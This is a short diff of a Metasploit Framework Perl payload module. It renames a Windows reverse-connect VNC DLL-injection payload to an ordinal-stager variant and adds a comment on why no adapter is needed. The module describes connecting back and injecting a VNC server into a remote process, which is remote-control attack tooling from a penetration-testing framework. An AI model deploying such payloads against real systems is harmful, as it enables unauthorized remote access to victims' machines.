@@ -7,18 +7,22 @@
 # version of the Framework can always be obtained from metasploit.com.
 ##
 
-package Msf::Payload::win32_reverse_vncinject;
+package Msf::Payload::win32_reverse_ord_vncinject;
 use strict;
 use base 'Msf::PayloadComponent::Win32InjectVncStage';
 use FindBin qw{$RealBin};
 
+# libinject ships over it's own resolver, and doesn't depend on the ebp
+# structures like the shell stages do.  This means that all it expects is
+# socket in edi, and that is the same as the ordinal stager spec.  So, no 
+# adapter needed or anything, just stage and go!
 sub load {
-  Msf::PayloadComponent::Win32InjectVncStage->import('Msf::PayloadComponent::Win32ReverseStager');
+  Msf::PayloadComponent::Win32InjectVncStage->import('Msf::PayloadComponent::Win32ReverseOrdinalStager');
 }
 
 my $info =
 {
-  'Name'         => 'Windows Reverse VNC Server DLL Inject',
+  'Name'         => 'Windows Reverse Ordinal VNC Server DLL Inject',
   'Version'      => '$Revision$',
   'Description'  => 'Connect back and inject a VNC server into the remote process',
                 
